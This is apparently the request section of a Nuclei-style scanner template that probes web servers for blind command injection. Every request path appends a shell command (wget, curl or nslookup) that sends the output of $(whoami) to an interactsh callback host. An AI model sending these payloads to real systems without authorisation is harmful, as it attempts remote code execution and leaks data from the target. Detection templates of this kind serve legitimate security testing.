http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/html

    '
  - 'GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /;curl $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /;curl $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/html

    '
  - "GET /;curl $(whoami).{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}        \n"
  - 'GET /;nslookup $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /;nslookup $(whoami).{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/html

    '
  - "GET /;nslookup $(whoami).{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}    \
    \    \n"
